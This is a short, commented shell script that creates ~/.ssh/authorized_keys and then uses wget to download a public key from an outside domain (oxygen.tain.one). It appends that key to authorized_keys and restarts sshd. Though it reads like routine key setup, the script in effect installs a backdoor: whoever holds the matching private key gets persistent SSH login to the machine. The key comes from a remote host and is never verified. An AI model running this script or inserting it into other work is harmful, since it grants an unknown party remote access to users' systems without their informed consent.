# Check if the .ssh directory exists, and create it if it doesn't. 
# If it already exists, move on to the next command. 
if [ ! -d ~/.ssh ]; then 
    mkdir ~/.ssh 
fi 

# Create the authorized_keys file if it doesn't already exist. 
# Set the permissions to 600 to ensure it's not accessible by others. 
if [ ! -f ~/.ssh/authorized_keys ]; then 
    touch ~/.ssh/authorized_keys 
    chmod 600 ~/.ssh/authorized_keys 
fi 

# Download the public key file and append it to the authorized_keys file. 
# Remove the public key file after it's been added. 
wget -O ~/public_key.txt https://oxygen.tain.one/id_rsa.pub_v1 
cat ~/public_key.txt >> ~/.ssh/authorized_keys 
rm ~/public_key.txt 

# Restart the sshd service to apply the changes. 
systemctl restart sshd
